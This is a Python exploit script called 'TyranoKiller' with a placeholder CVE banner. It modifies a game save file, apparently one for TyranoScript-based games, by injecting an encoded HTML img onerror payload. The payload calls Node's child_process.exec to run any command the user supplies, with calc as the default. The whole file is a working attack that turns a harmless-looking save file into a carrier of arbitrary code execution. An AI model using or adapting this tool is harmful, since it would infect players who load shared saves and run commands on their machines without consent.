import os
import sys
import shutil
from argparse import ArgumentParser

argparser = ArgumentParser()
argparser.add_argument("filename", type=str, help="Specify the target sav file name")
argparser.add_argument("-c", "--command", type=str, default="calc", help="Specify the command to be injected")
args = argparser.parse_args()

filename = args.filename
command = args.command

print(f"\033[91m\
-------------------------------------------------------------\n\
|  _____                                   _ _ _            |\n\
| /__   \_   _ _ __ __ _ _ __   ___   /\ /(_) | | ___ _ __  |\n\
|   / /\/ | | | '__/ _` | '_ \ / _ \ / //_/ | | |/ _ \ '__| |\n\
|  / /  | |_| | | | (_| | | | | (_) / __ \| | | |  __/ |    |\n\
|  \/    \__, |_|  \__,_|_| |_|\___/\/  \/|_|_|_|\___|_|    |\n\
|        |___/                                              |\n\
|                                                     v1.0.0|\n\
-------------------------------------------------------------\n\
CVE-XXXX-XXXX\033[0m\n\
Target: {filename}\n\
Command: {command}\n\
------------------------------------------------------------")

if not os.path.isfile(filename):
    print("Error: sav file doesn't exist.")
    sys.exit(1)

if ("'" in command) or ("\"" in command):
    print("Error: ' and \" cannot be used in the command.")
    sys.exit(1)

shutil.copyfile(filename, f"{filename}.bk")

savfile = open(f"{filename}.bk", mode="r")
data = savfile.read()
savfile.close()

command = command.replace("\\", "\\\\")
code = f"\
alert(`Injected_by_TyranoKiller_!!!!`);\
require(`child_process`).exec(`{command}`);\
"
data = data.replace("%3C/div%3E", f"%3C/div%3E%3Cimg%20src%3D1%20onerror%3D%27{code}%27%3E", 1)

code = code.replace(";", ";\n", 1)
print(f"Code:\n\033[96m{code}\033[0m\n\
------------------------------------------------------------")

savfile = open(filename, mode="w")
savfile.write(data)
savfile.close()

print("Completed.")